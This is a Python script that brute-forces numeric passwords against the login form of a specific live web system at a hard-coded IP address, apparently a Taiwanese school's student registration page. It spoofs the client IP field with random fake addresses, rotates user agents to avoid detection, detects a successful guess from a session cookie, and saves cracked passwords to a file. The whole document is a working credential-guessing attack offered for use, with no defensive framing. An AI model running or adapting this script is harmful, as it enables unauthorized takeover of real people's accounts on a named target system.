import requests,os
from fake_useragent import UserAgent
from datetime import datetime, timedelta, timezone
from faker import Faker
ua = UserAgent()
faker = Faker()

def attack(target,logfilename,start,digit,addname = False,ename = None):
    # check input
    if addname == True and type(ename) is not str:
        raise ValueError('ename not inputed')
    if type(start) is not bool:
        raise ValueError('start must be boolean')
    if type(logfilename) is not str:
        raise ValueError('log file name must be a string')
    if type(target) is not str:
        raise ValueError('Target Must Be string')
    if type(digit) is not int:
        raise ValueError('Digit Must Be an interger')
    if digit <= 0:
        raise ValueError('Digit Must Bigger Than One')
    #define passwd start
    if start == True:
        passwd = 0
    else:
        passwd = 9
        if len(str(passwd)) < digit:
            for i in range(digit-1):	
                passwd = int(str(passwd) + '9')
    #define passwd end
    while True:
        #check if passwd > digit
        if len(str(passwd)) > digit or passwd < 0:
            break
        #define spasswd
        if addname == True:
            spasswd = ename + str(passwd)
        else:
            spasswd = str(passwd)
        #define spasssd end
        #post request
        header = {'User-Agent':ua.chrome,'Upgrade-Insecure-Requests':'1','Referer':'http://140.126.151.12/csnskj/Permain.asp','Origin':'http://140.126.151.12','Host':'140.126.151.12','Content-Type':'application/x-www-form-urlencoded','Connection':'keep-alive','Cache-Control':'max-age=0','Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate'}
        r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
        'SCH_NO':'',
        'Time':'',
        'LEVEL':'0',
        'REMOTE_HOST':str(faker.ipv4()),
        'txtT_NO':'',
        'txtName':target.encode('big5'),
        'txtPass':spasswd
        },headers=header,allow_redirects=False)
        r.encoding = 'big5'
        rheader = r.headers['Set-Cookie']
        if 'mPass' in rheader:
            dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
            dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
            twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
            #we fuck out the real passwd
            file = open('passwd.txt','a+')
            file.write(str(spasswd)+'\n')
            file.close()
            print('\n passwd is ' +spasswd)
            file = open(logfilename,'a')
            item = '['+str(start)+','+twt+',]:Fucked the password,'+str(spasswd)+'\n'
            file.write(item)
            file.close()
            os._exit(1)
        else:
            dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
            dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
            twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
            #not yet
            file = open(logfilename,'w')
            file.write(str(spasswd))
            file.close()
            if start == True:
                passwd +=1
            else:
                passwd = passwd -1